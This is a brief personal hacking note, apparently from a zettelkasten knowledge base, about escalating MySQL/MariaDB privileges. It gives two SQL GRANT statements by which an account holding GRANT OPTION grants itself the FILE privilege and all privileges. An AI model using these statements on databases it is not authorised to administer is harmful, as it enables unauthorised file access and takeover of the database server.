# mysql mariadb exploit GRANT OPTION to grant file write permissions to self
must have `GRANT OPTION` permission
```SQL
GRANT FILE ON *.* TO 'uname'@'localhost' with grant option;
grant all privileges on dbname.* to 'yourusername'@'%' with grant option;
```

# References
- [20221003151236](/zet/20221003151236/README.md) mysql mariadb
- ~/kb/hacking/tricks/mysql-tricks.md

Tags:
    #assorted
